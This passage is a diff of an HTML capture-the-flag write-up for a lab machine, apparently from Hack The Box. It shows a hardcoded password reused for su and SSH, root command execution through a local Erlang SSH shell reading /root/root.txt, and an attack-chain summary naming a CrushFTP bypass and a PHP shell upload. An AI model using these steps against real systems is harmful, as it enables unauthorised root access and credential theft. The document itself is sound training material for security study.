+        {auth_methods, "publickey,password"},
 
-        {user_passwords, [{&quot;ben&quot;, &quot;HouseH0ldings998&quot;}]},
+        {user_passwords, [{"ben", "HouseH0ldings998"}]},
         {idle_time, infinity},
         {max_channels, 10},
         {max_sessions, 10},
         {parallel_login, true}
     ]) of
-        {ok, _Pid} -&gt;
-            io:format(&quot;SSH daemon running on port 2222. Press Ctrl+C to exit.~n&quot;);
-        {error, Reason} -&gt;
-            io:format(&quot;Failed to start SSH daemon: ~p~n&quot;, [Reason])
+        {ok, _Pid} ->
+            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
+        {error, Reason} ->
+            io:format("Failed to start SSH daemon: ~p~n", [Reason])
     end,
 
     receive
-        stop -&gt; ok
-    end.
-</code></pre><p id="26ae36ec-aa11-80e9-904a-d5e36499d982" class="">We found ben credential <code>ben:HouseH0ldings998</code></p><p id="26ae36ec-aa11-80f0-9691-ef8bf3e2d866" class="">Read user.txt flag🚩</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26ae36ec-aa11-80af-b39d-fb7c27182543" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">su ben
+        stop -> ok
+    end.</code></pre>
+
+                    <p>We found ben credential <code>ben:HouseH0ldings998</code></p>
+
+                    <p>Read user.txt flag🚩</p>
+
+                    <pre><code class="language-bash">su ben
 Password: HouseH0ldings998
 whoami
 ben
@@ -855,22 +674,132 @@ cd ben
 ls
 user.txt
 cat user.txt
-8116a3f49273c16a51206d9ac3a69c0b</code></pre><p id="26ae36ec-aa11-8037-80ec-fabcc010b156" class="">
-</p><p id="26ae36ec-aa11-8005-a0b4-d03ac0b51567" class="">
-</p></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Root &lt;/&gt;</summary><div class="indented"><p id="26ae36ec-aa11-805c-ab08-c9d0a5a42d73" class="">Let’s ssh into ben to get stable shell</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26ae36ec-aa11-80f2-be70-fc4b36e2cfe1" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">└─# ssh ben@10.10.11.86
-The authenticity of host &#x27;10.10.11.86 (10.10.11.86)&#x27; can&#x27;t be established.
-ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
-This host key is known by the following other names/addresses:
-    ~/.ssh/known_hosts:6: [hashed name]
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added &#x27;10.10.11.86&#x27; (ED25519) to the list of known hosts.
-ben@10.10.11.86&#x27;s password:
-Last login: Wed Sep 10 02:19:24 2025 from 10.10.14.17
-ben@soulmate:~$ ls</code></pre><p id="26ae36ec-aa11-808d-b9cd-f7115a7a3861" class="">We know there&#x27;s an Erlang-based SSH service running on port 2222 <code>case ssh:daemon(2222</code>. We can attempt to SSH into localhost account.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26ae36ec-aa11-8070-90f9-d0cc01d9ee13" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">Warning: Permanently added &#x27;[localhost]:2222&#x27; (ED25519) to the list of known hosts.
-ben@localhost&#x27;s password:
+8116a3f49273c16a51206d9ac3a69c0b</code></pre>
+                </div>
+            </details>
+
+            <details open>
+                <summary>Root &lt;/&gt;</summary>
+                <div class="indented">
+                    <p>Let's ssh into ben to get stable shell</p>
+
+                    <pre><code class="language-bash">ssh ben@10.10.11.86</code></pre>
+
+                    <p>We know there's an Erlang-based SSH service running on port 2222 <code>case ssh:daemon(2222</code>. We can attempt to SSH into localhost account.</p>
+
+                    <pre><code class="language-bash">ssh ben@localhost -p 2222
+Warning: Permanently added '[localhost]:2222' (ED25519) to the list of known hosts.
+ben@localhost's password:
 Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
-(ssh_runner@soulmate)1&gt;</code></pre><p id="26ae36ec-aa11-8038-aca3-cab0e1e15b7b" class="">Check our current privlege</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26ae36ec-aa11-806d-95c9-c66a68957135" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">(ssh_runner@soulmate)2&gt; os:cmd(&quot;whoami&quot;).
-&quot;root\n&quot;</code></pre><p id="26ae36ec-aa11-8029-994f-e0c9e6c39490" class="">Read <code>root&lt;/&gt;</code> flag 🥳</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26ae36ec-aa11-80cc-b9a0-f42a8dd87d2a" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">(ssh_runner@soulmate)6&gt; os:cmd(&quot;cat /root/root.txt&quot;).
-&quot;54e38f0eb10e8fc9473db12bf9d45d6b\n&quot;
-(ssh_runner@soulmate)7&gt;</code></pre><p id="26ae36ec-aa11-8095-b008-eb1fb020f99c" class="">
-</p></div></details></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
+(ssh_runner@soulmate)1></code></pre>
+
+                    <p>Check our current privlege</p>
+
+                    <pre><code class="language-erlang">(ssh_runner@soulmate)2> os:cmd("whoami").
+"root\n"</code></pre>
+
+                    <p>Read <code>root&lt;/&gt;</code> flag 🥳</p>
+
+                    <pre><code class="language-erlang">(ssh_runner@soulmate)6> os:cmd("cat /root/root.txt").
+"54e38f0eb10e8fc9473db12bf9d45d6b\n"
+(ssh_runner@soulmate)7></code></pre>
+                </div>
+            </details>
+
+            <!-- Summary Section -->
+            <div class="step-section">
+                <h2>🎯 Attack Chain Summary</h2>
+                <p>This machine demonstrated a complete web application to root compromise through CVE exploitation and credential discovery:</p>
+
+                <pre><code class="language-text">Web Reconnaissance 
+    → Subdomain Discovery (ftp.soulmate.htb)
+    → CrushFTP Identification
+    → CVE-2025-31161 Authentication Bypass
+    → User Creation via Malicious Request
+    → Administrative Interface Access
+    → Password Reset for Ben User
+    → PHP Shell Upload to webProd
+    → Initial Shell Access
+    → Credential Discovery in Erlang Script
+    → SSH Access as Ben
+    → Local Erlang SSH Service (Port 2222)
+    → Root Shell Execution</code></pre>
+
+                <h3>Key Techniques Demonstrated</h3>
+                <ul>
+                    <li><strong>CVE Exploitation:</strong> CVE-2025-31161 CrushFTP authentication bypass</li>
+                    <li><strong>Subdomain Discovery:</strong> Using gobuster for vhost enumeration</li>
+                    <li><strong>Credential Discovery:</strong> Finding hardcoded credentials in configuration files</li>
+                    <li><strong>File Upload Exploitation:</strong> Uploading PHP shells through FTP interface</li>
+                    <li><strong>Privilege Escalation:</strong> Leveraging misconfigured Erlang SSH service running as root</li>
+                    <li><strong>Service Enumeration:</strong> Automated privilege escalation discovery with linpeas</li>
+                </ul>
+
+                <h3>Tools and Technologies Used</h3>
+                <ul>
+                    <li><strong>Nmap:</strong> Network reconnaissance and service enumeration</li>
+                    <li><strong>Gobuster:</strong> Subdomain and directory discovery</li>
+                    <li><strong>Burp Suite:</strong> Web application testing and request manipulation</li>
+                    <li><strong>msfvenom:</strong> Payload generation for reverse shells</li>
+                    <li><strong>Metasploit:</strong> Multi-handler for catching reverse shells</li>
+                    <li><strong>linpeas:</strong> Automated privilege escalation discovery</li>
+                    <li><strong>CrushFTP:</strong> Target FTP service with authentication bypass vulnerability</li>
+                    <li><strong>Erlang:</strong> SSH service configuration and command execution</li>
+                </ul>
+
+                <div class="warning-box">
+                    <strong>Defensive Recommendations:</strong> Regular software updates, proper input validation, secure credential storage, service hardening, and monitoring of authentication logs can prevent these attack vectors. Additionally, avoiding hardcoded credentials in configuration files and implementing proper privilege separation for services is critical for security.
+                </div>
+            </div>
+        </section>
+
+        <div class="nav-buttons">
+            <a href="../index.html" class="nav-button">
+                <i class="fas fa-home"></i> Back to Home
+            </a>
+            <a href="#" class="nav-button disabled">
+                Next Writeup <i class="fas fa-arrow-right"></i>
+            </a>
+        </div>
+    </main>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    
+    <script>
+        // Reading progress bar
+        function updateReadingProgress() {
+            const article = document.querySelector('.writeup-content');
+            const progressBar = document.getElementById('reading-progress');
+            
+            const articleTop = article.offsetTop;
+            const articleHeight = article.offsetHeight;
+            const windowHeight = window.innerHeight;
+            const scrollTop = window.pageYOffset;
+            
+            const progress = (scrollTop - articleTop + windowHeight/2) / articleHeight;
+            const progressPercentage = Math.max(0, Math.min(100, progress * 100));
+            
+            progressBar.style.width = progressPercentage + '%';
+        }
+
+        // Smooth scrolling for TOC links
+        document.querySelectorAll('.toc a').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Initialize
+        window.addEventListener('scroll', updateReadingProgress);
+        window.addEventListener('load', updateReadingProgress);
+    </script>
+</body>
+</html>
